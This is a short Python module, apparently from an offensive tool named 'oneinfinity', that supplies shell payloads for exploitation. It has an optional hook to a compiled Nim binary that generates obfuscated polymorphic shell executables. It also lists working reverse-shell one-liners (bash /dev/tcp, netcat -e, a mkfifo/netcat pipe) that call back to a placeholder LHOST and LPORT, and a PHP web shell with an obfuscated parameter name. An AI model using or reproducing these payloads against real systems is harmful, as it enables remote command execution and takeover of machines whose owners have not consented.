"""Shell payloads — NIM fast-path + Python baseline."""
from __future__ import annotations
import os as _os
if _os.environ.get('ONEINFINITY_NIM_SHELL', '0') == '1':
    try:
        from oneinfinity.infra.nim_runner import run_nim_binary as _run_nim
        def generate_shell_payloads(arch='x64', fmt='exe', obfuscate=True):  # type: ignore[misc]
            """Generate polymorphic shell payloads via compiled Nim binary."""
            _args = [f'--arch={arch}', f'--format={fmt}']
            if obfuscate:
                _args.append('--obfuscate')
            return _run_nim('oi-shell-gen', _args)
    except Exception:
        pass  # fall through to Python baseline

from oneinfinity.arsenal.context_matcher import Payload

_RS = ["shell", "rce", "reverse-shell"]
_WS = ["shell", "rce", "webshell"]

SHELL_PAYLOADS = [
    Payload("bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
            vuln_type="rce", complexity="complex", tags=_RS + ["bash"]),
    Payload("nc -e /bin/sh LHOST LPORT",
            vuln_type="rce", complexity="simple", tags=_RS + ["netcat"]),
    Payload("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f",
            vuln_type="rce", complexity="medium", tags=_RS + ["netcat", "fifo"]),
    Payload("<?php system(\\$_GET[chr(39)+chr(99)+chr(109)+chr(100)+chr(39)]); ?>",
            vuln_type="rce", complexity="simple", tech_stack=["php"], tags=_WS + ["php"]),
]
